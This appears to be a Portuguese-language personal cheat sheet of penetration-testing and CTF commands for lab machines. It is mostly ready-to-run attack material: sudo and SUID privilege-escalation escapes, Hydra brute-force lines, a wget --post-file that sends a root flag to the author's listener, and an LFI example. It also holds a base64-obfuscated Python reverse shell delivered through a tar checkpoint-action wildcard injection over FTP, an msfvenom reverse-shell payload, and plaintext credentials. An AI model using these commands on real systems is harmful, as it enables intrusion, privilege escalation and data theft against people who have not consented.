my ip = 10.2.29.121
ip machine = 10.10.51.168


10113 10415 21033 
fergus

seina@fowsniff
scoobydoo2
S1ck3nBluff+secureshell


python3 -c "import pty; pty.spawn('/bin/bash')" #usar em shell

exploit/unix/webapp/wp_admin_shell_upload #wordpress

sudo -l #listar permissões

sudo vim -c ":!/bin/sh" #caso tenhamos acesso ao vim

pas #ftp passive mode (caso não seja possivel usar nenhum comando)

sudo pkexec /bin/bash #caso tenhamos permissão de utilizar o pkexec

steghide extract -sf $imagem$.jpg #extrair img

crontab --help #tentar em linux

man scp #copiar arquivos de uma maquina ssh por exemplo

sudo --version #verificar versão do sudo

sudo -u \#$((0xffffffff)) /bin/bash #caso seja inferior a 1.8.28

hashcat -a 0 #tipoDeAtaque -m 1800 #moduloNumero hash /home/yagho/Documentos/rockyou.txt

grep -nr '#string' #procurar string especifica em todos os arquivos

grep -nr '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' #procurar ip em todos os arquivos

sha1sum #file  #transformar arquivos em hash(checando a integridade)

find / -name "user.txt" -exec ls -lt {} \; 2>/dev/null #achar arquivos com "shadow" a partir da raiz geralmente contem as senhas(hash) de usuarios caso tenhamos permissão

:18234:0:99999:7::: #parte final com 3 pontos em um hash não conta

exiftool #image.jpg #metadados padrões

fcrackzip -vbDp <path-to-rockyou.txt> <filename> #quebrar zips

ls -l /usr/bin/find #verificar permissões do find(pode ser trocado por outro programa)

find $file-name -exec $command \; #O comando find vem com a opção de executar outros comandos caso tenhamos pemrissão de utiliza-lo

find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null #4000=suid buscar por arquivos suid em / e jogar todos os erros para /dev/null, executar ls caso tenhamos permissao de usar find

find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null | grep "/bin" #4000=suid buscar por arquivos suid em / e jogar todos os erros para /dev/null, executar ls caso tenhamos permissao de usar find, grep para mostrar apenas arquivos executaveis

system-control #caso exista um binário com este nome(repositorio do git podemos copia-lo para dentro da máquina)

l#comando  #executar comandos localmente via meterpreter(minha máquina)

sed 'line-number!d' filename #pesquisar algo escrito em uma linha especifica de um arquivo

ssh #user@#ip -i #arquivoComChave #usar em ssh quando tivermos a chave rsa

sudo /usr/bin/wget --post-file=/root/root_flag.txt http://#ip:#porta que o netcat escuta no nosso pc  #caso tenhamos acesso ao wget como sudower

showmount -e  <machine IP> #verificar nfs

mount <machine IP>:<pasta do servidor que contem o arquivo> <pasta que salvarei> #baixar aquivo contido no nfs

umount -f -l <caminho onde conectou o nfs> #NÃO ESQUECER DE DESMONTAR

mysql -h remote-ip -u<username> -p<password> #efetuar login em mysqlserver

show databases; #mostrar bancos de dados em um servidor mysql

show tables; #mostrar tabelas em um banco de dados mysql

select * from <campo>; #mostrar todos os dados em um campo de uma tabela em um servidor mysql

strings <arquivo> #pesquisar determinada string no codigo de um arquivo, pode ser usado com | grep "como começa a string"

stegoveritas <imagem> #dividir imagem em várias

binwalk <arquivo> #ver possiveis extrações de um arquivo

zsteg <arquivo> #arquivos com formatos que o steghide não consegue extrair

openssl rsa -in <Encrypted key filename>  -out < desired output file name> #desencriptar private key de ssl

md5sum <arquivo>.gpg #verificar arquivos com md5 incluido

gpg -d <arquivo>.gpg #decryptar o md5

openssl rsautl -decrypt -inkey <private-key> -in <encrypted-file> -out <decrypted-file> #para desencriptar rsautl com uma private key que possuimos

https://example.com/?include_file=file1.php #para servidores com falha no php, exibem qualquer arquivo se não tiver filtro(LFI)

tres arquivos python no git um para contar quantos arquivos possuem determinada palavra, um para extrair varios zips de uma vez dentro de uma pastas, um para buscar o nome de um arquivo com uma determinada string #EDITAR diretorios e modificações

hydra -l <username> -P <path-to-short-rockyou> <remote-ip> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V #exemplo de bruteforce com hydra em formulario web

hydra -l <username> -P <full path to pass> <ip> -t 4 ssh #hydra em ssh

hydra -l user -P passlist.txt ftp://192.168.0.1 #hydra em ftp

php -S <tun IP>:8000 #iniciar servidor php

cat /etc/crontab #verificar crontab mal-configurado

<numero de linhas a copiar(nada se for uma apenas)>yy #copiar arquivo dentro do vim

y$ #copiar ate o final de uma linha no vim

p #colar algo apos ou antes do cursor(vim)

<numero de linhas a cortar(nada se for uma apenas)>d #cortar algo(vim)

/<padrao> #pesquisar padrao com vimgrep para pesquisar para tras basta usar ? no lugar de barra para buscar algo na mesma direção deve se usar n para buscar na outra direção usar N

stegcracker <file> [<wordlist>] #quebrar senha para steghide

gcc -o <output-file> <source-file> #compilar um arquivo C

scp file.txt remote_username@10.10.0.2:/remote/directory #copiar arquivos no linux

zip, tar, gzip #formatos para pesquisar no fuzzing caso tenhamos pastas de backups

curl -s -v -P - 'ftp://backupmgr:REMOVED@172.20.0.1/'  #usar em rede interna com algum arquivo de ftp por exemplo

cd /tmp/                                                                                                                                                            echo "python3 -c \"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICBzdWJwcm9jZXNzICAgICAgICAgLCAgICAgIG9zICAgICA7ICAgICAgaG9zdD0iMTAuNi44LjU5IiAgICAgOyAgICAgIHBvcnQ9MTMzNyAgICAgOyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgICwgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICA7ICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAgLCAgICAgIHBvcnQpKSAgICAgOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgICAwKSAgICAgOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgICAxKSAgICAgOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgICAyKSAgICAgOyAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))\"" > shell.sh                                                                                                                                                          echo "" > "--checkpoint-action=exec=sh shell.sh"                                                                                                                 echo "" > --checkpoint=1         #exemplo de como preparar uma shell criada pelo msfvenom  
  
msfvenom -p cmd/unix/reverse_python  lhost=10.6.8.59 lport=1337 R #comando de payload msfvenom

curl -T "--checkpoint-action=exec=sh shell.sh" -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' 
curl -T "--checkpoint=1" -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
curl -T shell.sh -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' #upload dos anteriores no servidor da intranet

curl -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' -s #executar curl

ln #utilitario para criar links simbólicos

strace e ltrace #o strace monitoram as chamadas do sistema e o ltrace monitora as chamadas às funções das bibliotecas carregadas 

sudo crontab -e #caso tenhamos acesso ao crontab como root

:!/bin/bash   #finalizar o vi assim para poder pega root, (util tambem depois de utilizar sudo crontab -e)

ps -aef  #listar todos of processos no linux







